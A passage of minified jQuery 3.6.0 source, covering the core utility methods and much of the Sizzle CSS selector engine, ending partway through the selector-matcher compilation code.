! function(e, t) {
    "use strict";
    "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function(e) {
        if (!e.document) throw new Error("jQuery requires a window with a document");
        return t(e)
    } : t(e)
}("undefined" != typeof window ? window : this, (function(e, t) {
    "use strict";
    var i = [],
        n = Object.getPrototypeOf,
        o = i.slice,
        r = i.flat ? function(e) {
            return i.flat.call(e)
        } : function(e) {
            return i.concat.apply([], e)
        },
        s = i.push,
        a = i.indexOf,
        l = {},
        c = l.toString,
        u = l.hasOwnProperty,
        d = u.toString,
        p = d.call(Object),
        f = {},
        h = function(e) {
            return "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item
        },
        v = function(e) {
            return null != e && e === e.window
        },
        g = e.document,
        m = {
            type: !0,
            src: !0,
            nonce: !0,
            noModule: !0
        };

    function y(e, t, i) {
        var n, o, r = (i = i || g).createElement("script");
        if (r.text = e, t)
            for (n in m)(o = t[n] || t.getAttribute && t.getAttribute(n)) && r.setAttribute(n, o);
        i.head.appendChild(r).parentNode.removeChild(r)
    }

    function b(e) {
        return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? l[c.call(e)] || "object" : typeof e
    }
    var w = "3.6.0",
        x = function(e, t) {
            return new x.fn.init(e, t)
        };

    function k(e) {
        var t = !!e && "length" in e && e.length,
            i = b(e);
        return !h(e) && !v(e) && ("array" === i || 0 === t || "number" == typeof t && t > 0 && t - 1 in e)
    }
    x.fn = x.prototype = {
        jquery: w,
        constructor: x,
        length: 0,
        toArray: function() {
            return o.call(this)
        },
        get: function(e) {
            return null == e ? o.call(this) : e < 0 ? this[e + this.length] : this[e]
        },
        pushStack: function(e) {
            var t = x.merge(this.constructor(), e);
            return t.prevObject = this, t
        },
        each: function(e) {
            return x.each(this, e)
        },
        map: function(e) {
            return this.pushStack(x.map(this, (function(t, i) {
                return e.call(t, i, t)
            })))
        },
        slice: function() {
            return this.pushStack(o.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        even: function() {
            return this.pushStack(x.grep(this, (function(e, t) {
                return (t + 1) % 2
            })))
        },
        odd: function() {
            return this.pushStack(x.grep(this, (function(e, t) {
                return t % 2
            })))
        },
        eq: function(e) {
            var t = this.length,
                i = +e + (e < 0 ? t : 0);
            return this.pushStack(i >= 0 && i < t ? [this[i]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor()
        },
        push: s,
        sort: i.sort,
        splice: i.splice
    }, x.extend = x.fn.extend = function() {
        var e, t, i, n, o, r, s = arguments[0] || {},
            a = 1,
            l = arguments.length,
            c = !1;
        for ("boolean" == typeof s && (c = s, s = arguments[a] || {}, a++), "object" == typeof s || h(s) || (s = {}), a === l && (s = this, a--); a < l; a++)
            if (null != (e = arguments[a]))
                for (t in e) n = e[t], "__proto__" !== t && s !== n && (c && n && (x.isPlainObject(n) || (o = Array.isArray(n))) ? (i = s[t], r = o && !Array.isArray(i) ? [] : o || x.isPlainObject(i) ? i : {}, o = !1, s[t] = x.extend(c, r, n)) : void 0 !== n && (s[t] = n));
        return s
    }, x.extend({
        expando: "jQuery" + (w + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(e) {
            throw new Error(e)
        },
        noop: function() {},
        isPlainObject: function(e) {
            var t, i;
            return !(!e || "[object Object]" !== c.call(e) || (t = n(e)) && ("function" != typeof(i = u.call(t, "constructor") && t.constructor) || d.call(i) !== p))
        },
        isEmptyObject: function(e) {
            var t;
            for (t in e) return !1;
            return !0
        },
        globalEval: function(e, t, i) {
            y(e, {
                nonce: t && t.nonce
            }, i)
        },
        each: function(e, t) {
            var i, n = 0;
            if (k(e))
                for (i = e.length; n < i && !1 !== t.call(e[n], n, e[n]); n++);
            else
                for (n in e)
                    if (!1 === t.call(e[n], n, e[n])) break;
            return e
        },
        makeArray: function(e, t) {
            var i = t || [];
            return null != e && (k(Object(e)) ? x.merge(i, "string" == typeof e ? [e] : e) : s.call(i, e)), i
        },
        inArray: function(e, t, i) {
            return null == t ? -1 : a.call(t, e, i)
        },
        merge: function(e, t) {
            for (var i = +t.length, n = 0, o = e.length; n < i; n++) e[o++] = t[n];
            return e.length = o, e
        },
        grep: function(e, t, i) {
            for (var n = [], o = 0, r = e.length, s = !i; o < r; o++) !t(e[o], o) !== s && n.push(e[o]);
            return n
        },
        map: function(e, t, i) {
            var n, o, s = 0,
                a = [];
            if (k(e))
                for (n = e.length; s < n; s++) null != (o = t(e[s], s, i)) && a.push(o);
            else
                for (s in e) null != (o = t(e[s], s, i)) && a.push(o);
            return r(a)
        },
        guid: 1,
        support: f
    }), "function" == typeof Symbol && (x.fn[Symbol.iterator] = i[Symbol.iterator]), x.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), (function(e, t) {
        l["[object " + t + "]"] = t.toLowerCase()
    }));
    var C = function(e) {
        var t, i, n, o, r, s, a, l, c, u, d, p, f, h, v, g, m, y, b, w = "sizzle" + 1 * new Date,
            x = e.document,
            k = 0,
            C = 0,
            T = le(),
            S = le(),
            A = le(),
            $ = le(),
            E = function(e, t) {
                return e === t && (d = !0), 0
            },
            P = {}.hasOwnProperty,
            O = [],
            D = O.pop,
            M = O.push,
            j = O.push,
            q = O.slice,
            L = function(e, t) {
                for (var i = 0, n = e.length; i < n; i++)
                    if (e[i] === t) return i;
                return -1
            },
            H = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            N = "[\\x20\\t\\r\\n\\f]",
            I = "(?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",
            z = "\\[[\\x20\\t\\r\\n\\f]*(" + I + ")(?:" + N + "*([*^$|!~]?=)" + N + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + I + "))|)" + N + "*\\]",
            _ = ":(" + I + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + z + ")*)|.*)\\)|)",
            W = new RegExp(N + "+", "g"),
            R = new RegExp("^[\\x20\\t\\r\\n\\f]+|((?:^|[^\\\\])(?:\\\\.)*)[\\x20\\t\\r\\n\\f]+$", "g"),
            F = new RegExp("^[\\x20\\t\\r\\n\\f]*,[\\x20\\t\\r\\n\\f]*"),
            V = new RegExp("^[\\x20\\t\\r\\n\\f]*([>+~]|[\\x20\\t\\r\\n\\f])[\\x20\\t\\r\\n\\f]*"),
            X = new RegExp(N + "|>"),
            B = new RegExp(_),
            Q = new RegExp("^" + I + "$"),
            Y = {
                ID: new RegExp("^#(" + I + ")"),
                CLASS: new RegExp("^\\.(" + I + ")"),
                TAG: new RegExp("^(" + I + "|[*])"),
                ATTR: new RegExp("^" + z),
                PSEUDO: new RegExp("^" + _),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\([\\x20\\t\\r\\n\\f]*(even|odd|(([+-]|)(\\d*)n|)[\\x20\\t\\r\\n\\f]*(?:([+-]|)[\\x20\\t\\r\\n\\f]*(\\d+)|))[\\x20\\t\\r\\n\\f]*\\)|)", "i"),
                bool: new RegExp("^(?:" + H + ")$", "i"),
                needsContext: new RegExp("^[\\x20\\t\\r\\n\\f]*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\([\\x20\\t\\r\\n\\f]*((?:-\\d)?\\d*)[\\x20\\t\\r\\n\\f]*\\)|)(?=[^-]|$)", "i")
            },
            U = /HTML$/i,
            G = /^(?:input|select|textarea|button)$/i,
            Z = /^h\d$/i,
            J = /^[^{]+\{\s*\[native \w/,
            K = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            ee = /[+~]/,
            te = new RegExp("\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\([^\\r\\n\\f])", "g"),
            ie = function(e, t) {
                var i = "0x" + e.slice(1) - 65536;
                return t || (i < 0 ? String.fromCharCode(i + 65536) : String.fromCharCode(i >> 10 | 55296, 1023 & i | 56320))
            },
            ne = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
            oe = function(e, t) {
                return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e
            },
            re = function() {
                p()
            },
            se = we((function(e) {
                return !0 === e.disabled && "fieldset" === e.nodeName.toLowerCase()
            }), {
                dir: "parentNode",
                next: "legend"
            });
        try {
            j.apply(O = q.call(x.childNodes), x.childNodes), O[x.childNodes.length].nodeType
        } catch (e) {
            j = {
                apply: O.length ? function(e, t) {
                    M.apply(e, q.call(t))
                } : function(e, t) {
                    for (var i = e.length, n = 0; e[i++] = t[n++];);
                    e.length = i - 1
                }
            }
        }

        function ae(e, t, n, o) {
            var r, a, c, u, d, h, m, y = t && t.ownerDocument,
                x = t ? t.nodeType : 9;
            if (n = n || [], "string" != typeof e || !e || 1 !== x && 9 !== x && 11 !== x) return n;
            if (!o && (p(t), t = t || f, v)) {
                if (11 !== x && (d = K.exec(e)))
                    if (r = d[1]) {
                        if (9 === x) {
                            if (!(c = t.getElementById(r))) return n;
                            if (c.id === r) return n.push(c), n
                        } else if (y && (c = y.getElementById(r)) && b(t, c) && c.id === r) return n.push(c), n
                    } else {
                        if (d[2]) return j.apply(n, t.getElementsByTagName(e)), n;
                        if ((r = d[3]) && i.getElementsByClassName && t.getElementsByClassName) return j.apply(n, t.getElementsByClassName(r)), n
                    } if (i.qsa && !$[e + " "] && (!g || !g.test(e)) && (1 !== x || "object" !== t.nodeName.toLowerCase())) {
                    if (m = e, y = t, 1 === x && (X.test(e) || V.test(e))) {
                        for ((y = ee.test(e) && me(t.parentNode) || t) === t && i.scope || ((u = t.getAttribute("id")) ? u = u.replace(ne, oe) : t.setAttribute("id", u = w)), a = (h = s(e)).length; a--;) h[a] = (u ? "#" + u : ":scope") + " " + be(h[a]);
                        m = h.join(",")
                    }
                    try {
                        return j.apply(n, y.querySelectorAll(m)), n
                    } catch (t) {
                        $(e, !0)
                    } finally {
                        u === w && t.removeAttribute("id")
                    }
                }
            }
            return l(e.replace(R, "$1"), t, n, o)
        }

        function le() {
            var e = [];
            return function t(i, o) {
                return e.push(i + " ") > n.cacheLength && delete t[e.shift()], t[i + " "] = o
            }
        }

        function ce(e) {
            return e[w] = !0, e
        }

        function ue(e) {
            var t = f.createElement("fieldset");
            try {
                return !!e(t)
            } catch (e) {
                return !1
            } finally {
                t.parentNode && t.parentNode.removeChild(t), t = null
            }
        }

        function de(e, t) {
            for (var i = e.split("|"), o = i.length; o--;) n.attrHandle[i[o]] = t
        }

        function pe(e, t) {
            var i = t && e,
                n = i && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
            if (n) return n;
            if (i)
                for (; i = i.nextSibling;)
                    if (i === t) return -1;
            return e ? 1 : -1
        }

        function fe(e) {
            return function(t) {
                return "input" === t.nodeName.toLowerCase() && t.type === e
            }
        }

        function he(e) {
            return function(t) {
                var i = t.nodeName.toLowerCase();
                return ("input" === i || "button" === i) && t.type === e
            }
        }

        function ve(e) {
            return function(t) {
                return "form" in t ? t.parentNode && !1 === t.disabled ? "label" in t ? "label" in t.parentNode ? t.parentNode.disabled === e : t.disabled === e : t.isDisabled === e || t.isDisabled !== !e && se(t) === e : t.disabled === e : "label" in t && t.disabled === e
            }
        }

        function ge(e) {
            return ce((function(t) {
                return t = +t, ce((function(i, n) {
                    for (var o, r = e([], i.length, t), s = r.length; s--;) i[o = r[s]] && (i[o] = !(n[o] = i[o]))
                }))
            }))
        }

        function me(e) {
            return e && void 0 !== e.getElementsByTagName && e
        }
        for (t in i = ae.support = {}, r = ae.isXML = function(e) {
                var t = e && e.namespaceURI,
                    i = e && (e.ownerDocument || e).documentElement;
                return !U.test(t || i && i.nodeName || "HTML")
            }, p = ae.setDocument = function(e) {
                var t, o, s = e ? e.ownerDocument || e : x;
                return s != f && 9 === s.nodeType && s.documentElement ? (h = (f = s).documentElement, v = !r(f), x != f && (o = f.defaultView) && o.top !== o && (o.addEventListener ? o.addEventListener("unload", re, !1) : o.attachEvent && o.attachEvent("onunload", re)), i.scope = ue((function(e) {
                    return h.appendChild(e).appendChild(f.createElement("div")), void 0 !== e.querySelectorAll && !e.querySelectorAll(":scope fieldset div").length
                })), i.attributes = ue((function(e) {
                    return e.className = "i", !e.getAttribute("className")
                })), i.getElementsByTagName = ue((function(e) {
                    return e.appendChild(f.createComment("")), !e.getElementsByTagName("*").length
                })), i.getElementsByClassName = J.test(f.getElementsByClassName), i.getById = ue((function(e) {
                    return h.appendChild(e).id = w, !f.getElementsByName || !f.getElementsByName(w).length
                })), i.getById ? (n.filter.ID = function(e) {
                    var t = e.replace(te, ie);
                    return function(e) {
                        return e.getAttribute("id") === t
                    }
                }, n.find.ID = function(e, t) {
                    if (void 0 !== t.getElementById && v) {
                        var i = t.getElementById(e);
                        return i ? [i] : []
                    }
                }) : (n.filter.ID = function(e) {
                    var t = e.replace(te, ie);
                    return function(e) {
                        var i = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                        return i && i.value === t
                    }
                }, n.find.ID = function(e, t) {
                    if (void 0 !== t.getElementById && v) {
                        var i, n, o, r = t.getElementById(e);
                        if (r) {
                            if ((i = r.getAttributeNode("id")) && i.value === e) return [r];
                            for (o = t.getElementsByName(e), n = 0; r = o[n++];)
                                if ((i = r.getAttributeNode("id")) && i.value === e) return [r]
                        }
                        return []
                    }
                }), n.find.TAG = i.getElementsByTagName ? function(e, t) {
                    return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : i.qsa ? t.querySelectorAll(e) : void 0
                } : function(e, t) {
                    var i, n = [],
                        o = 0,
                        r = t.getElementsByTagName(e);
                    if ("*" === e) {
                        for (; i = r[o++];) 1 === i.nodeType && n.push(i);
                        return n
                    }
                    return r
                }, n.find.CLASS = i.getElementsByClassName && function(e, t) {
                    if (void 0 !== t.getElementsByClassName && v) return t.getElementsByClassName(e)
                }, m = [], g = [], (i.qsa = J.test(f.querySelectorAll)) && (ue((function(e) {
                    var t;
                    h.appendChild(e).innerHTML = "<a id='" + w + "'></a><select id='" + w + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && g.push("[*^$]=[\\x20\\t\\r\\n\\f]*(?:''|\"\")"), e.querySelectorAll("[selected]").length || g.push("\\[[\\x20\\t\\r\\n\\f]*(?:value|" + H + ")"), e.querySelectorAll("[id~=" + w + "-]").length || g.push("~="), (t = f.createElement("input")).setAttribute("name", ""), e.appendChild(t), e.querySelectorAll("[name='']").length || g.push("\\[[\\x20\\t\\r\\n\\f]*name[\\x20\\t\\r\\n\\f]*=[\\x20\\t\\r\\n\\f]*(?:''|\"\")"), e.querySelectorAll(":checked").length || g.push(":checked"), e.querySelectorAll("a#" + w + "+*").length || g.push(".#.+[+~]"), e.querySelectorAll("\\\f"), g.push("[\\r\\n\\f]")
                })), ue((function(e) {
                    e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                    var t = f.createElement("input");
                    t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && g.push("name[\\x20\\t\\r\\n\\f]*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && g.push(":enabled", ":disabled"), h.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && g.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), g.push(",.*:")
                }))), (i.matchesSelector = J.test(y = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector)) && ue((function(e) {
                    i.disconnectedMatch = y.call(e, "*"), y.call(e, "[s!='']:x"), m.push("!=", _)
                })), g = g.length && new RegExp(g.join("|")), m = m.length && new RegExp(m.join("|")), t = J.test(h.compareDocumentPosition), b = t || J.test(h.contains) ? function(e, t) {
                    var i = 9 === e.nodeType ? e.documentElement : e,
                        n = t && t.parentNode;
                    return e === n || !(!n || 1 !== n.nodeType || !(i.contains ? i.contains(n) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(n)))
                } : function(e, t) {
                    if (t)
                        for (; t = t.parentNode;)
                            if (t === e) return !0;
                    return !1
                }, E = t ? function(e, t) {
                    if (e === t) return d = !0, 0;
                    var n = !e.compareDocumentPosition - !t.compareDocumentPosition;
                    return n || (1 & (n = (e.ownerDocument || e) == (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !i.sortDetached && t.compareDocumentPosition(e) === n ? e == f || e.ownerDocument == x && b(x, e) ? -1 : t == f || t.ownerDocument == x && b(x, t) ? 1 : u ? L(u, e) - L(u, t) : 0 : 4 & n ? -1 : 1)
                } : function(e, t) {
                    if (e === t) return d = !0, 0;
                    var i, n = 0,
                        o = e.parentNode,
                        r = t.parentNode,
                        s = [e],
                        a = [t];
                    if (!o || !r) return e == f ? -1 : t == f ? 1 : o ? -1 : r ? 1 : u ? L(u, e) - L(u, t) : 0;
                    if (o === r) return pe(e, t);
                    for (i = e; i = i.parentNode;) s.unshift(i);
                    for (i = t; i = i.parentNode;) a.unshift(i);
                    for (; s[n] === a[n];) n++;
                    return n ? pe(s[n], a[n]) : s[n] == x ? -1 : a[n] == x ? 1 : 0
                }, f) : f
            }, ae.matches = function(e, t) {
                return ae(e, null, null, t)
            }, ae.matchesSelector = function(e, t) {
                if (p(e), i.matchesSelector && v && !$[t + " "] && (!m || !m.test(t)) && (!g || !g.test(t))) try {
                    var n = y.call(e, t);
                    if (n || i.disconnectedMatch || e.document && 11 !== e.document.nodeType) return n
                } catch (e) {
                    $(t, !0)
                }
                return ae(t, f, null, [e]).length > 0
            }, ae.contains = function(e, t) {
                return (e.ownerDocument || e) != f && p(e), b(e, t)
            }, ae.attr = function(e, t) {
                (e.ownerDocument || e) != f && p(e);
                var o = n.attrHandle[t.toLowerCase()],
                    r = o && P.call(n.attrHandle, t.toLowerCase()) ? o(e, t, !v) : void 0;
                return void 0 !== r ? r : i.attributes || !v ? e.getAttribute(t) : (r = e.getAttributeNode(t)) && r.specified ? r.value : null
            }, ae.escape = function(e) {
                return (e + "").replace(ne, oe)
            }, ae.error = function(e) {
                throw new Error("Syntax error, unrecognized expression: " + e)
            }, ae.uniqueSort = function(e) {
                var t, n = [],
                    o = 0,
                    r = 0;
                if (d = !i.detectDuplicates, u = !i.sortStable && e.slice(0), e.sort(E), d) {
                    for (; t = e[r++];) t === e[r] && (o = n.push(r));
                    for (; o--;) e.splice(n[o], 1)
                }
                return u = null, e
            }, o = ae.getText = function(e) {
                var t, i = "",
                    n = 0,
                    r = e.nodeType;
                if (r) {
                    if (1 === r || 9 === r || 11 === r) {
                        if ("string" == typeof e.textContent) return e.textContent;
                        for (e = e.firstChild; e; e = e.nextSibling) i += o(e)
                    } else if (3 === r || 4 === r) return e.nodeValue
                } else
                    for (; t = e[n++];) i += o(t);
                return i
            }, n = ae.selectors = {
                cacheLength: 50,
                createPseudo: ce,
                match: Y,
                attrHandle: {},
                find: {},
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: !0
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: !0
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function(e) {
                        return e[1] = e[1].replace(te, ie), e[3] = (e[3] || e[4] || e[5] || "").replace(te, ie), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                    },
                    CHILD: function(e) {
                        return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || ae.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && ae.error(e[0]), e
                    },
                    PSEUDO: function(e) {
                        var t, i = !e[6] && e[2];
                        return Y.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : i && B.test(i) && (t = s(i, !0)) && (t = i.indexOf(")", i.length - t) - i.length) && (e[0] = e[0].slice(0, t), e[2] = i.slice(0, t)), e.slice(0, 3))
                    }
                },
                filter: {
                    TAG: function(e) {
                        var t = e.replace(te, ie).toLowerCase();
                        return "*" === e ? function() {
                            return !0
                        } : function(e) {
                            return e.nodeName && e.nodeName.toLowerCase() === t
                        }
                    },
                    CLASS: function(e) {
                        var t = T[e + " "];
                        return t || (t = new RegExp("(^|[\\x20\\t\\r\\n\\f])" + e + "(" + N + "|$)")) && T(e, (function(e) {
                            return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "")
                        }))
                    },
                    ATTR: function(e, t, i) {
                        return function(n) {
                            var o = ae.attr(n, e);
                            return null == o ? "!=" === t : !t || (o += "", "=" === t ? o === i : "!=" === t ? o !== i : "^=" === t ? i && 0 === o.indexOf(i) : "*=" === t ? i && o.indexOf(i) > -1 : "$=" === t ? i && o.slice(-i.length) === i : "~=" === t ? (" " + o.replace(W, " ") + " ").indexOf(i) > -1 : "|=" === t && (o === i || o.slice(0, i.length + 1) === i + "-"))
                        }
                    },
                    CHILD: function(e, t, i, n, o) {
                        var r = "nth" !== e.slice(0, 3),
                            s = "last" !== e.slice(-4),
                            a = "of-type" === t;
                        return 1 === n && 0 === o ? function(e) {
                            return !!e.parentNode
                        } : function(t, i, l) {
                            var c, u, d, p, f, h, v = r !== s ? "nextSibling" : "previousSibling",
                                g = t.parentNode,
                                m = a && t.nodeName.toLowerCase(),
                                y = !l && !a,
                                b = !1;
                            if (g) {
                                if (r) {
                                    for (; v;) {
                                        for (p = t; p = p[v];)
                                            if (a ? p.nodeName.toLowerCase() === m : 1 === p.nodeType) return !1;
                                        h = v = "only" === e && !h && "nextSibling"
                                    }
                                    return !0
                                }
                                if (h = [s ? g.firstChild : g.lastChild], s && y) {
                                    for (b = (f = (c = (u = (d = (p = g)[w] || (p[w] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] || [])[0] === k && c[1]) && c[2], p = f && g.childNodes[f]; p = ++f && p && p[v] || (b = f = 0) || h.pop();)
                                        if (1 === p.nodeType && ++b && p === t) {
                                            u[e] = [k, f, b];
                                            break
                                        }
                                } else if (y && (b = f = (c = (u = (d = (p = t)[w] || (p[w] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] || [])[0] === k && c[1]), !1 === b)
                                    for (;
                                        (p = ++f && p && p[v] || (b = f = 0) || h.pop()) && ((a ? p.nodeName.toLowerCase() !== m : 1 !== p.nodeType) || !++b || (y && ((u = (d = p[w] || (p[w] = {}))[p.uniqueID] || (d[p.uniqueID] = {}))[e] = [k, b]), p !== t)););
                                return (b -= o) === n || b % n == 0 && b / n >= 0
                            }
                        }
                    },
                    PSEUDO: function(e, t) {
                        var i, o = n.pseudos[e] || n.setFilters[e.toLowerCase()] || ae.error("unsupported pseudo: " + e);
                        return o[w] ? o(t) : o.length > 1 ? (i = [e, e, "", t], n.setFilters.hasOwnProperty(e.toLowerCase()) ? ce((function(e, i) {
                            for (var n, r = o(e, t), s = r.length; s--;) e[n = L(e, r[s])] = !(i[n] = r[s])
                        })) : function(e) {
                            return o(e, 0, i)
                        }) : o
                    }
                },
                pseudos: {
                    not: ce((function(e) {
                        var t = [],
                            i = [],
                            n = a(e.replace(R, "$1"));
                        return n[w] ? ce((function(e, t, i, o) {
                            for (var r, s = n(e, null, o, []), a = e.length; a--;)(r = s[a]) && (e[a] = !(t[a] = r))
                        })) : function(e, o, r) {
                            return t[0] = e, n(t, null, r, i), t[0] = null, !i.pop()
                        }
                    })),
                    has: ce((function(e) {
                        return function(t) {
                            return ae(e, t).length > 0
                        }
                    })),
                    contains: ce((function(e) {
                        return e = e.replace(te, ie),
                            function(t) {
                                return (t.textContent || o(t)).indexOf(e) > -1
                            }
                    })),
                    lang: ce((function(e) {
                        return Q.test(e || "") || ae.error("unsupported lang: " + e), e = e.replace(te, ie).toLowerCase(),
                            function(t) {
                                var i;
                                do {
                                    if (i = v ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (i = i.toLowerCase()) === e || 0 === i.indexOf(e + "-")
                                } while ((t = t.parentNode) && 1 === t.nodeType);
                                return !1
                            }
                    })),
                    target: function(t) {
                        var i = e.location && e.location.hash;
                        return i && i.slice(1) === t.id
                    },
                    root: function(e) {
                        return e === h
                    },
                    focus: function(e) {
                        return e === f.activeElement && (!f.hasFocus || f.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                    },
                    enabled: ve(!1),
                    disabled: ve(!0),
                    checked: function(e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && !!e.checked || "option" === t && !!e.selected
                    },
                    selected: function(e) {
                        return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                    },
                    empty: function(e) {
                        for (e = e.firstChild; e; e = e.nextSibling)
                            if (e.nodeType < 6) return !1;
                        return !0
                    },
                    parent: function(e) {
                        return !n.pseudos.empty(e)
                    },
                    header: function(e) {
                        return Z.test(e.nodeName)
                    },
                    input: function(e) {
                        return G.test(e.nodeName)
                    },
                    button: function(e) {
                        var t = e.nodeName.toLowerCase();
                        return "input" === t && "button" === e.type || "button" === t
                    },
                    text: function(e) {
                        var t;
                        return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
                    },
                    first: ge((function() {
                        return [0]
                    })),
                    last: ge((function(e, t) {
                        return [t - 1]
                    })),
                    eq: ge((function(e, t, i) {
                        return [i < 0 ? i + t : i]
                    })),
                    even: ge((function(e, t) {
                        for (var i = 0; i < t; i += 2) e.push(i);
                        return e
                    })),
                    odd: ge((function(e, t) {
                        for (var i = 1; i < t; i += 2) e.push(i);
                        return e
                    })),
                    lt: ge((function(e, t, i) {
                        for (var n = i < 0 ? i + t : i > t ? t : i; --n >= 0;) e.push(n);
                        return e
                    })),
                    gt: ge((function(e, t, i) {
                        for (var n = i < 0 ? i + t : i; ++n < t;) e.push(n);
                        return e
                    }))
                }
            }, n.pseudos.nth = n.pseudos.eq, {
                radio: !0,
                checkbox: !0,
                file: !0,
                password: !0,
                image: !0
            }) n.pseudos[t] = fe(t);
        for (t in {
                submit: !0,
                reset: !0
            }) n.pseudos[t] = he(t);

        function ye() {}

        function be(e) {
            for (var t = 0, i = e.length, n = ""; t < i; t++) n += e[t].value;
            return n
        }

        function we(e, t, i) {
            var n = t.dir,
                o = t.next,
                r = o || n,
                s = i && "parentNode" === r,
                a = C++;
            return t.first ? function(t, i, o) {
                for (; t = t[n];)
                    if (1 === t.nodeType || s) return e(t, i, o);
                return !1
            } : function(t, i, l) {
                var c, u, d, p = [k, a];
                if (l) {
                    for (; t = t[n];)
                        if ((1 === t.nodeType || s) && e(t, i, l)) return !0
                } else
                    for (; t = t[n];)
                        if (1 === t.nodeType || s)
                            if (u = (d = t[w] || (t[w] = {}))[t.uniqueID] || (d[t.uniqueID] = {}), o && o === t.nodeName.toLowerCase()) t = t[n] || t;
                            else {
                                if ((c = u[r]) && c[0] === k && c[1] === a) return p[2] = c[2];
                                if (u[r] = p, p[2] = e(t, i, l)) return !0
                            } return !1
            }
        }

        function xe(e) {
            return e.length > 1 ? function(t, i, n) {
                for (var o = e.length; o--;)
                    if (!e[o](t, i, n)) return !1;
                return !0
            } : e[0]
        }

        function ke(e, t, i, n, o) {
            for (var r, s = [], a = 0, l = e.length, c = null != t; a < l; a++)(r = e[a]) && (i && !i(r, n, o) || (s.push(r), c && t.push(a)));
            return s
        }

        function Ce(e, t, i, n, o, r) {
            return n && !n[w] && (n = Ce(n)), o && !o[w] && (o = Ce(o, r)), ce((function(r, s, a, l) {
                var c, u, d, p = [],
                    f = [],
                    h = s.length,
                    v = r || function(e, t, i) {
                        for (var n = 0, o = t.length; n < o; n++) ae(e, t[n], i);
                        return i
                    }(t || "*", a.nodeType ? [a] : a, []),
                    g = !e || !r && t ? v : ke(v, p, e, a, l),
                    m = i ? o || (r ? e : h || n) ? [] : s : g;
                if (i && i(g, m, a, l), n)
                    for (c = ke(m, f), n(c, [], a, l), u = c.length; u--;)(d = c[u]) && (m[f[u]] = !(g[f[u]] = d));
                if (r) {
                    if (o || e) {
                        if (o) {
                            for (c = [], u = m.length; u--;)(d = m[u]) && c.push(g[u] = d);
                            o(null, m = [], c, l)
                        }
                        for (u = m.length; u--;)(d = m[u]) && (c = o ? L(r, d) : p[u]) > -1 && (r[c] = !(s[c] = d))
                    }
                } else m = ke(m === s ? m.splice(h, m.length) : m), o ? o(null, s, m, l) : j.apply(s, m)
            }))
        }

        function Te(e) {
            for (var t, i, o, r = e.length, s = n.relative[e[0].type], a = s || n.relative[" "], l = s ? 1 : 0, u = we((function(e) {
                    return e === t
                }), a, !0), d = we((function(e) {
                    return L(t, e) > -1
                }), a, !0), p = [function(e, i, n) {
                    var o = !s && (n || i !== c) || ((t = i).nodeType ? u(e, i, n) : d(e, i, n));
                    return t = null, o
                }]; l < r; l++)
                if (i = n.relative[e[l].type]) p = [we(xe(p), i)];
                else {
                    if ((i = n.filter[e[l].type].apply(null, e[l].matches))[w]) {
                        for (o = ++l; o < r && !n.relative[e[o].type]; o++);
                        return Ce(l > 1 && xe(p), l > 1 && be(e.slice(0, l - 1).concat({
                            value: " " === e[l - 2].type ? "*" : ""
                        })).replace(R, "$1"), i, l < o && Te(e.slice(l, o)), o < r && Te(e = e.slice(o)), o < r && be(e))
                    }
                    p.push(i)
                } return xe(p)
        }
